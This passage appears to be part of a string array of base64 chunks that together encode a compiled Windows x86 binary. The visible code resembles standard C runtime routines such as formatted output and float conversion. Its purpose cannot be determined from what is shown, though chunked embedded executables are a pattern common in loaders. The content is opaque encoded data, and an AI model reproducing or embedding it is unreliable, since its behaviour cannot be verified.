m9AAAAhf8PiJ0AAAA7PSSiARAPg5EAAACLx8H4BYlF5Ivfg+MfweMGiwSFEIcBEA++RBgEg+ABdHBX6JgoAABZg2X8AItF5IsEhRCHARD2RBgEAXQY/3UU/3UQ/3UMV+hnAAAAg8QQi/CL2usV6K+z///HAAkAAADocLP//4MgAIveiXXYiV3cx0X8/v///+gNAAAAi9PrK4t9CItd3It12FfoqykAAFnD6D+z//+DIADoa7P//8cACQAAAOjbr///i9aLxuhoov//w1WL7FFRVot1CFdW6BApAACDz/9ZO8d1Eeg5s///xwAJAAAAi8eL1+tE/3UUjU34Uf91EP91DFD/FQgBARCFwHUP/xUcAAEQUOjosv//WevTi8aD5h/B+AXB5gaLBIUQhwEQgGQwBP2LRfiLVfxfXovlXcNVi+z/BSCRARBWvgAQAABW6AOh//9Zi00IiUEIhcB0CYNJDAiJcRjrEYNJDASNQRSJQQjHQRgCAAAAi0EIg2EEAIkBXl3DVYvsgeyAAgAAoQhwARAzxYlF/ItFCI2NkP3//1NWiYXQ/f//i0UMV/91EIt9FImF8P3//zPAi9iJveT9//+Jhaz9//+L8Imd6P3//4mFwP3//4mF3P3//4mFzP3//4mFsP3//4mFuP3//4mFvP3//+hssf//6COy//+JhaT9//+LhdD9//+FwA+EsgoAAPZADEB1Y1Do5fP//1mLyIP5/3QZg/n+dBSL0cH4BYPiH8HiBgMUhRCHARDrBbrwcgEQ9kIkfw+FdgoAAIP5/3QZg/n+dBSLwYPhH8H4BcHhBgMMhRCHARDrBbnwcgEQ9kEkgA+FSQoAAIuV8P3//4XSD4Q7CgAAihIzwImF2P3//4vIiY3g/f//iYXI/f//iYWo/f//iJXv/f//iJW0/f//hNIPhB4KAACLhfD9//9AiYXw/f//hckPiOUJAACNQuA8WHcPD77CD7aA+EcBEIPgD+sCM8CLvcj9//9rwAkPtrw4GEgBEIvHib3I/f//i73k/f//wegEiYXI/f//g/gID4SrCQAAg/gHD4d3CQAA/ySFo60AEDPAg43c/f///4vYiYWw/f//iYW4/f//iYXA/f//iYXM/f//iZ3o/f//iYW8/f//6TwJAAAPvsKD6CB0RoPoA3Q5g+gIdC9ISHQdg+gDi4Xw/f//D4UdCQAAg8sIiZ3o/f//6Q8JAACDywSJnej9///p+wgAAIPLAevwgcuAAAAA6+iDywLr44D6KnUviweDxwSJveT9//+JhcD9//+FwA+JywgAAIPLBPfYiZ3o/f//iYXA/f//6bUIAABrjcD9//8KD77Cg8HQA8GJhcD9///plQgAADPAiYXc/f//6Y4IAACA+ip1K4sHg8cEiYXc/f//hcCLhfD9//+JveT9//8PiXAIAACDjdz9////6WQIAABrjdz9//8KD77Cg8HQA8GJhdz9///pPggAAID6SXRFgPpodDiLhfD9//+A+mx0FID6dw+FLAgAAIHLAAgAAOkH////gDhsdQxAgcsAEAAA6fb+//+DyxDp7v7//4PLIOn0/v//i4Xw/f//igA8NnUci73w/f//gH8BNHUQi8eDwAKBywCAAADpvv7//zwzdRyLvfD9//+AfwEydRCLx4PAAoHj/3///+me/v//PGQPhKoHAAA8aQ+EogcAADxvD4SaBwAAPHUPhJIHAAA8eA+EigcAADxYD4SCBwAAM8CJhcj9///rAjPAiYW8/f//jYWQ/f//UA+2wlDoLQwAAFlZhcB0OI2F4P3//1D/tdD9////tbT9///oyQcAAIuN8P3//4PEDIoBQYiFtP3//4mN8P3//4TAD4RNBwAAjYXg/f//UP+10P3///+1tP3//+iRBwAAg8QM6fwGAAAPvsKD+GQPj80BAAAPhFECAACD+FMPj+0AAAB0fIPoQXQQSEh0VkhIdAhISA+FGAUAAIDCIMeFsP3//wEAAACIle/9//+Lhdz9//+NtfT9//+Dy0C5AAIAAImd6P3//4mNxP3//4XAD4kyAgAAx4Xc/f//BgAAAOmAAgAA98MwCAAAD4WeAAAAgcsACAAAiZ3o/f//6Y0AAAD3wzAIAAB1DIHLAAgAAImd6P3//4uV3P3//7n///9/g/r/dAKLyos3g8cEib3k/f//98MQCAAAD4RTBAAAhfZ1Bos1dHEBEMeFvP3//wEAAACLxoXJdA8z0klmORB0B4PAAoXJdfMrxtH46TwEAACD6FgPhLACAABISHRwg+gHD4Qn////SEgPhSQEAACDxwSJveT9///3wxAIAAB0MA+3R/xQaAACAACNhfT9//9QjYXY/f//UOj/CwAAg8QQhcB0H8eFuP3//wEAAADrE4pH/IiF9P3//8eF2P3//wEAAACNtfT9///pxQMAAIsHg8cEib3k/f//hcB0M4twBIX2dCwPvwD3wwAIAAB0FJkrwseFvP3//wEAAADR+OmKAwAAM8mJjbz9///pfQMAAIs1cHEBEFboI43//1npawMAAIP4cA+P4wEAAA+EzwEAAIP4ZQ+MWQMAAIP4Zw+OS/7//4P4aXRkg/hudCWD+G8PhT0DAADHhdj9//8IAAAAhNt5W4HLAAIAAImd6P3//+tNg8cEib3k/f//i3/86OAJAACFwA+E6wQAAIuF4P3///bDIHQFZokH6wKJB8eFuP3//wEAAADpegQAAIPLQImd6P3//8eF2P3//woAAAD3wwCAAAB1DPfDABAAAA+EjgEAAIsPg8cIib3k/f//M/aLf/zprgEAAHURgPpndVbHhdz9//8BAAAA60o7wX4Ii8GJhdz9//89owAAAH43jbhdAQAAV+jumf//ipXv/f//iYWo/f//WYXAdAqL8Im9xP3//+sKx4Xc/f//owAAAIu95P3//4sHg8cIiYWA/f//ib3k/f//i0f8iYWE/f//jYWQ/f//UP+1sP3//w++wv+13P3//1D/tcT9//+NhYD9//9WUP81WHMBEP8VSAABEP/Qi/uDxByB54AAAAB0IYO93P3//wB1GI2FkP3//1BW/zVkcwEQ/xVIAAEQ/9BZWYC97/3//2d1HIX/dRiNhZD9//9QVv81YHMBEP8VSAABEP/QWVmAPi0PhSj+//+BywABAABGiZ3o/f//6Rb+///Hhdz9//8IAAAAagfrHIPocw+E3/z//0hID4SW/v//g+gDD4VrAQAAaifHhdj9//8QAAAAWImFrP3//4TbD4l8/v//BFHGhdT9//8wiIXV/f//x4XM/f//AgAAAOle/v//g8cEM/aJveT9///2wyB0EfbDQHQGD79H/OsOD7dH/OsI9sNAdAqLR/yZi8iL+usFi0/8i/72w0B0HDv+fxh8BDvOcxL32RP+99+BywABAACJnej9///3wwCQAAB1Aov+i5Xc/f//hdJ5BTPSQusUg+P3uAACAACJnej9//870H4Ci9CLwQvHdQaJtcz9//+NdfOLwkqJldz9//+FwH8Gi8ELx3Q9i4XY/f//mVJQV1HoqQgAAIPBMImdjP3//4mFxP3//4v6g/k5fgYDjaz9//+Lldz9//+IDk6Ljc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QHi034g2Fw/YvlXcNVi+xqAP91COi5////WVldw4sNCHABEDPAg8kBOQ0kkQEQD5TAw1WL7IPsEFOLXQxXi30Qhdt1EoX/dA6LRQiFwHQDgyAAM8Drf4tFCIX','sQyzDLUMtwy5DLsMvQy/DIEMwwzFDMcMyQzLDM0MzwzRDNMM1QzXDNkM2wzdDN8M4QzjDOUM5wzpDOsM7QzvDPEM8wz1DPcM+Qz7DP0M/wzBDQMNBQ0HDQkNCw0NDQ8NEQ0TDRUNFw0ZDRsNHQ0fDSENIw0lDScNKQ0rDS0NLw0xDTMNNQ03DTkNOw09DT8NAQ1DDUUNRw1JDUsNTQ1PDVENUw1VDVcNWQ1bDV0NXw1hDWMNZQ1nDWkNaw1tDW8NcQ1zDXUNdw15DXsNfQ1/DUENgw2FDYcNiQ2LDY0Njw2RDZMNlQ2XDZkNmw2dDZ8NoQ2jDaUNpw2pDasNrQ2vDbENsw21DbcNuQ26DbwNvg2ADcINxA3GDcgNyg3MDc4N0A3SDdQN1g3YDdoN3A3eDeAN4g3kDeYN6A3qDewN7g3wDfIN9A32DfgN+g38Df4NwA4CDgQOBg4IDgoODA4ODhAOEg4UDhYOGA4aDhwOHg4gDiIOJA4mDigOKg4sDi4OMA4yDjQONg44DjoOPA4+DgAOQg5EDkYOSA5KDkwOTg5QDlIOVA5WDlgOWg5cDl4OYA5iDmQOZg5oDmoObA5uD','+A4lVrIl1tIPgBw+EzgIAAGvIDLgAgAAAA8qJTbBmOQFyEYvxjX24jU24iU2wpaWl/026D7d5CotVzovHM8KJXYQlAIAAAIld1IlFoLj/fwAAI9CJXdgj+Ild3I0EFw+38Lj/fwAAiXWUZjvQD4NJAgAAZjv4D4NAAgAAuP2/AABmO/APhzICAAC4vz8AAGY78HcIiV3M6TcCAABmhdJ1JEb3Rcz///9/iXWUdReDfcgAdRGDfcQAdQszwGaJRc7pFAIAAGaF/3UWRvdBCP///3+JdZR1CTlZBHUEORl0tGoFi8ONVdhfiUWMiX2YiX2khf9+WI11xI00Ro1BCIlFnA+3BolFpItFnItNpIldiA+3AA+vyIlNpANK/DtK/HIFO02kcwUzwEDrA4tFiIlK/IXAdANm/wKDbZwCg8YCT4X/f72LTbCLfZiLRYyDwgJAT4lFjIl9mIX/f5KLdZSLVdyBxgLAAACLfdSJVbBmhfZ+O4XSeDKLRdiL18HqH4vIA8DB6R8LwgP/i1WwiUXYA9K4//8AAIl91AvRA/CJVbCJVdxmhfZ/ymaF9n9puP//AAAD8GaF9nldi12Ei8b32A+3wIlFmAPw9kXUAXQBQ4tN2IvCweAfiU2w0W2wCUWwi0WwweEf0e/R6gv5/02YiVXciUXYiX3Udc5qAIXbiVWwW3QSZovHM/9HZgvHZolF1It91OsEZotF1LoAgAAAZjvCdw6B5///AQCB/wCAAQB1QItF1oP4/3U0i0XaiV3Wg/j/dSBmi0Xeuf//AACJXdpmO8F1B2aJVd5G6wxmQGaJRd7rBECJRdqLTdzrB0CJRdaLTbCLVay4/38AAGY78HIfM8CJXchmOUWgiV3ED5TASCUAAACABQCA/3+JRczrOmaLRdYLdaBmiUXEi0XYiUXGiU3KZol1zusgM8BmOUWgD5TASCUAAACABQCA/3+JRcyJXciJXcSLVayLdbSF9g+FE/3//4tFzA+3TcSLVcaLdcrB6BDrMjP/i8uLw4vzi9ONXwHrI7j/fwAAvgAAAIBqAusQi8uLw4vzi9PrC4vDi/NqBIvLi9Nbi32AC0WQZolHCovDZokPiVcCiXcGi038X14zzVvoxz7//4vlXcP73QAQTd4AEKfeABDY3gAQOd8AELzfABDV3wAQOOAAEBrgABB64AAQb+AAEETgABBVi+y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','ICAgICA','KAAAFDcBEAEsAAAgNwEQCSwAACw3ARAKLAAAODcBEAEwAABENwEQCTAAAFA3ARAKMAAAXDcBEAE0AABoNwEQCTQAAHQ3ARAKNAAAgDcBEAE4AACMNwEQCjgAAJg3ARABPAAApDcBEAo8AACwNwEQAUAAALw3ARAKQAAAyDcBEApEAADUNwEQCkgAAOA3ARAKTAAA7DcBEApQAAD4NwEQBHwAAAQ4ARAafAAAFDgBECAwARBCAAAAcC8BECwAAAAcOAEQcQAAAAguARAAAAAAKDgBENgAAAA0OAEQ2gAAAEA4ARCxAAAATDgBEKAAAABYOAEQjwAAAGQ4ARDPAAAAcDgBENUAAAB8OAEQ0gAAAIg4ARCpAAAAlDgBELkAAACgOAEQxAAAAKw4ARDcAAAAuDgBEEMAAADEOAEQzAAAANA4ARC/AAAA3DgBEMgAAABYLwEQKQAAAOg4ARCbAAAAADkBEGsAAAAYLwEQIQAAABg5ARBjAAAAEC4BEAEAAAAkOQEQRAAAADA5ARB9AAAAPDkBELcAAAAYLgEQAgAAAFQ5ARBFAAAAMC4BEAQAAABgOQEQRwAAAGw5ARCHAAAAOC4BEAUAAAB4OQEQSAAAAEAuARAGAAAAhDkBEKIAAACQOQEQkQAAAJw5ARBJAAAAqDkBELMAAAC0OQEQqwAAABgwARBBAAAAwDkBEIsAAABILgEQBwAAANA5ARBKAAAAUC4BEAgAAADcOQEQowAAAOg5ARDNAAAA9DkBEKwAAAAAOgEQyQAAAAw6ARCSAAA','dw1WL7ItNCDPA9sEQdAFA9sEIdAODyAT2wQR0A4PICPbBAnQDg8gQ9sEBdAODyCD3wQAACAB0A4PIAlaL0b4AAwAAV78AAgAAI9Z0I4H6AAEAAHQWO9d0CzvWdRMNAAwAAOsMDQAIAADrBQ0ABAAAi9GB4gAAAwB0DIH6AAABAHUGC8frAgvGX173wQAABAB0BQ0AEAAAXcNqFGigYQEQ6GFQ//8z9ol15It9CIP//nUQ6INh///HAAkAAADptwAAAIX/D4ifAAAAOz0kogEQD4OTAAAAi8fB+AWJReCL34PjH8HjBosEhRCHARAPvkQDBIPgAXRyV+jz1f//WYl1/ItF4IsEhRCHARD2RAMEAXQoV+js1v//WVD/FTgAARCFwHUI/xUcAAEQi/CJdeSF9nQY6M5g//+JMOj7YP//xwAJAAAAg87/iXXkx0X8/v///+gKAAAAi8brIYt9CIt15FfoBNf//1nD6Mxg///HAAkAAADoPF3//4PI/+jKT///w1WL7FaLdQhXg8//hfZ1FOikYP//xwAWAAAA6BRd//8Lx+tF9kYMg3Q5VuhH0f//Vov46HYEAABW6F2i//9Q6PUCAACDxBCFwHkFg8//6xODfhwAdA3/dhzoilH//4NmHABZg2YMAIvHX15dw2oMaMBhARDoDE///4PP/4l95DPAi3UIhfYPlcCFwHUY6Cdg///HABYAAADol1z//4vH6CZP///D9kYMQHQGg2YMAOvsVugOof//WYNl/ABW6D////9Zi/iJfeTHRfz+////6AgAAADrx4t1CIt95FboUqH//1nDoRh/ARCD+P90DIP4/nQHUP8VpAABEMMzwFBQagNQagNoAAAAQGjoVAEQ/xUgAAEQoxh/ARDDVYvsg+wcU4tdEDPSuE5AAABWV4lF/IkTiVMEiVMIOVUMD4Y8AQAAi8qJVRCJTfSJVfiLVfSNfeSL84vBwegfA9KlpaWLdRCLzot9+AP2C/DB6R8D/4vCC/nB6B+LzgPSA/bB6R8L8IkTi0XkA/8L+YlzBAPCiXsIM8mJRRA7wnIFO0XkcwMzyUGJA4XJdB6LxjPJjXABO/ByBYP+AXMDM8lBiXMEhcl0BEeJewiLVegzwI0MFolN9DvOcgQ7ynMDM8BAiUsEhcB0BEeJewiLVRCLwot19APSA33sA/aDZfAAA//B6B8L8MHpH4tFCAv5iROJcwSJewgPvgCJdRCJffiJReSNDAKJTfQ7ynIEO8hzBTPAQOsDi0XwiQuFwHQki8Yz0o1wAYl1EDvwcgWD','Dv4i0Xgav9fcgU7RdxzAzPJQYlElfBKeCiFyXQhi0SV8IvLjXgBO/iJfeCLx3IFg/gBcwMzyUGJRJXwSnnbg8//i03Qi1XUi8fT4CFElfBCO9Z9EY198IvOjTyXK8ozwPOrg8//iw30fgEQQYvBmYPiHwPCwfgFiUXYgeEfAACAeQVJg8ngQYlN3IvD0+dqIIld4PfXi13cWSvLiUXMiU3ci1SF8IvLi8LT6otNzCPHC1XgiVSN8ItN3NPgiUXgi0XMQIlFzDvGfNeLddiNVfiLxsHgAmoCK9Az21k7znwIiwKJRI3w6wSJXI3wg+oESXnq6dj9//87Deh+ARAPjKIAAACLDfR+ARCNffAzwKurq4vBgU','RfyLRQiJRYCLRQyJRZgzwFMz20BWiUWUi/OLw4ldkFeNfeCJXbSJXaCJXaSJXZyJXaw5RSR1F+gSd///xwAWAAAA6IJz//8zwOkIBwAAi1UQi8qJTbCKCoD5IHQPgPkJdAqA+Qp0BYD5DXUDQuvnigpCiE2rg/gLD4d7AgAA/ySF3eQAEI1BzzwIdwZqA1hK692LRSSLAIuAhAAAAIsAOgh1BWoFWOvHD77Bg+grdB9ISHQOg+gDD4WOAgAAM8BA661qArkAgAAAWIlNkOugagJYiV2Q65gzwECJRaCNQc88CHaoi0UkiwCLgIQAAACLADoIdQ','nAOcg50DnYOeA56DnwOfg5ADoIOhA6GDogOig6MDo4OkA6SDpQOlg6YDpoOnA6eDqAOog6kDqYOqA6qDqwOrg6wDrIOtA62DrgOug68Dr4OgA7CDsQOxg7IDsoOzA7ODtAO0g7UDtYO2A7aDtwO3g7gDuIO5A7mDugO6g7sDu4O8A7yDvQO9g74DvoO/A7+DsAPAg8EDwYPCA8KDwwPDg8QDxIPFA8WDxgPGg8cDx4PIA8iDyQPJg8oDyoPLA8uDzAPMg80DzYPOA86DzwPPg8AD0IPRA9GD0gPSg9MD04PUA9SD1QPVg9YD1oPXA9eD2APYg9kD2YPaA9qD2wPbg9wD3IPdA92D3gPeg98D34PQA+AAAAQAEA0AAAAMgwzDDQMNQw2DDcMOAw5DDoMOww8DD0MPgw/DAAMQQxCDEMMRAxFDEYMRwxIDEkMSgxLDEwMTQxODE8MUAxRDFIMUwxUDFUMVgxXDFgMWQxaDFsMXAxdDF4MXwxgDGEMYgxjDGQMZQxmDGcMaAxpDGoMawxsDG0MbgxvDHAMcQ','+tX3tkz0t/g9sRBdQFCi0X6uQP8//+D4A+DyBBmiUX6i0UIO8F9KSvIi0X09kX0AXQFhf91AUfR6PZF+AGJRfR0CA0AAACAiUX00W34SXXc3UX0hdJ0Atngi0UM3RjrAzP/R4X/X3QIahDoDAQAAFmD5v32wxB0EfZFECB0C2og6PYDAABZg+bvM8CF9l4PlMBbi+Vdw1WL7GoA/3Uc/3U